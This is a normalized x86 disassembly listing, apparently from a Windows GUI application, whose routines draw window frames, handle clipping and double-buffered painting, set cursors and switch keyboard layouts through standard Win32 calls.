jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41f034
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_4156e4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41f034
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4156e4
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_433a48
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_4362b4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_439924
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_433a48
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_4362b4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_4362b4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_433a48
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_439924
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_416b18
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_439a78
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43959c
jmp r-xdata
mov eax ebx
call sub_438618
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_439bca
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_4362b4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_439a78
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_439bd8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439bf8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439c6c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439c8c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439cac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439cd0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439cf4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439d18
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439568
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439d3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42b194
mov edi eax
mov eax edi
call sub_42b274
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41fcf4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b8e8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42b374
jmp r-xdata
sub_439dc4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_436be8
test bl bl
je r-xdata
mov eax edi
call sub_43bbf8
mov eax edi
call sub_43b7f0
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43b7f0
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_439e84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_436844
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_439ed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43bbf8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_4381a8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403360
sub_439f1c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_434c50
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4391d4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454304
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43a06c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43a14b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a152
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43b8e8
mov dl [ ebx + 0x184 ]
call sub_440494
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452764
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d30
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452564
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452564
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452564
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43a158
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a1e9
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452764
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d30
test eax eax
je r-xdata
mov eax ebx
call sub_43b8e8
mov dl 0x1
call sub_440478
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43a244
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4156d4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_4362b4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43a294
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43a2c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403360
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403360
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43a308
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_4362b4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43a360
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41c9c0
mov edx [ r-xdata ]
call sub_403314
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43a398
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_416b18
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a3bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b8e8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43a418
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43a384
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_416b18
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43a458
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405774
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405774
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43a4c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43a56c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a573
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_432db8
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403164
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_40575c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403360
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405774
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ edi + 0x178 ] eax
sub_43a57c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_438180
xor edx edx
push ebp
push sub_43a63e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403360
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a645
mov eax [ ebp - 0x4 ]
call sub_438188
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43a645
mov eax [ ebp - 0x4 ]
call sub_44bae0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43536c
sub_43a690
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4030ac
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436f74
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43a6fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43536c
sub_43a714
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43a73c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44bae0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b9e8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403360
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a73c
test al al
jne r-xdata
sub_43a7a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a73c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c9a0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a7d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a73c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c9a0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a7fc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43a824
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44bae0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b9e8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403360
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a824
test al al
jne r-xdata
sub_43a88c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a824
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a8ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a824
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a8ec
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44bae0
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403360
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a8ec
test al al
jne r-xdata
sub_43a950
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a8ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
